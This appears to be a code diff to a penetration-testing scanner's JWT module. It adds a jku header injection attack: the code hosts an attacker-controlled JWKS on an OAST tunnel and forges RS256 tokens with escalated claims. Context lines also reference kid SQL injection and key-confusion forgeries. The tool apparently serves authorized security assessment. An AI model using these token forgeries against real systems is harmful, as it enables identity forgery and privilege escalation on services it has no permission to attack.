@@ -24,7 +24,8 @@ endpoint ignores auth:
 Each forgery also TAMPERS a claim (role/admin/user) so a hit proves identity forgery, not just a
 replay. alg:none and HMAC use only base64/hmac/hashlib; RS->HS confusion, jwk and x5c need RSA
 signing and JWK->PEM, which come from `cryptography`. jku/x5u (fetch an attacker-HOSTED JWKS) are
-not forged here because confirming them needs an attacker endpoint the target can reach back to.
+forged by HOSTING a JWKS on an OAST tunnel the target fetches (best-effort; skipped when egress
+is blocked). x5u is left out for the same reason jku needs the tunnel.
 """
 
 from __future__ import annotations
@@ -422,6 +423,53 @@ def _kid_forgeries(header, payload):
         yield "kid header SQL injection", _hs(dict(base, alg="HS256", kid=kid), esc, key, "sha256")
 
 
+def _try_jku(assessment_id, header, payload, sandbox, oracle, session_headers, token, target,
+             log) -> int:
+    """jku header injection: HOST a JWKS containing our public key on an attacker URL (an OAST
+    cloudflared tunnel), point the token's jku header at it, and sign RS256 with our private key.
+    A server that fetches the jku URL and trusts the key accepts the forgery. Best-effort: if no
+    tunnel comes up (egress blocked), it skips — the oracle gate means a skip never false-positives.
+    """
+    r = _rsa()
+    if not r:
+        return 0
+    _h, _ser, _pad, rsa = r
+    try:
+        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    except Exception:
+        return 0
+    jwk = _pub_jwk(key)
+    try:
+        d = sandbox.oast_start("tunnel", serve_path="/jwks.json",
+                               serve_body=json.dumps({"keys": [jwk]}))
+    except Exception as e:
+        log(f"jwt-attack: jku tunnel unavailable ({type(e).__name__}) — skipping jku")
+        return 0
+    domain = d.get("domain") if isinstance(d, dict) else None
+    if not domain:
+        err = (d or {}).get("error", "no tunnel") if isinstance(d, dict) else "no tunnel"
+        log(f"jwt-attack: jku tunnel did not come up ({err}) — skipping jku")
+        return 0
+    try:
+        jku_url = f"https://{domain}/jwks.json"
+        log(f"jwt-attack: hosting attacker JWKS at {jku_url} for jku injection")
+        base = {k: v for k, v in header.items() if k.lower() not in ("jwk", "x5c", "x5u")}
+        forged = _rs256_sign(dict(base, alg="RS256", kid=jwk["kid"], jku=jku_url),
+                             _escalate(payload), key)
+        if _accepted(sandbox, oracle["url"], session_headers, token, forged, oracle):
+            _file(assessment_id, oracle["url"], "jku header injection (attacker-hosted JWKS)",
+                  token, forged,
+                  f"The server fetched a JWKS from the attacker-controlled jku URL {jku_url} and "
+                  "trusted that key to verify a forged token.", log)
+            return 1
+    finally:
+        try:
+            sandbox.oast_stop()
+        except Exception:
+            pass
+    return 0
+
+
 def _file(assessment_id, url, kind, token, forged, detail, log):
     from owlforge.store.db import session
     from owlforge.store.models import Finding
@@ -591,6 +639,9 @@ def jwt_attack_scan(assessment_id, inventory, sandbox, session_headers=None,
                                   "An RSA-family forgery was accepted (confusion or header-"
                                   "carried key).", log)
                             filed += 1
+                    if "kid" in header or "jku" in header:
+                        filed += _try_jku(assessment_id, header, payload, sandbox, oracle,
+                                          session_headers, token, target, log)
                 for kind, forged in _kid_forgeries(header, payload):
                     if _accepted(sandbox, oracle["url"], session_headers, token, forged, oracle):
                         _file(assessment_id, oracle["url"], kind, token, forged,
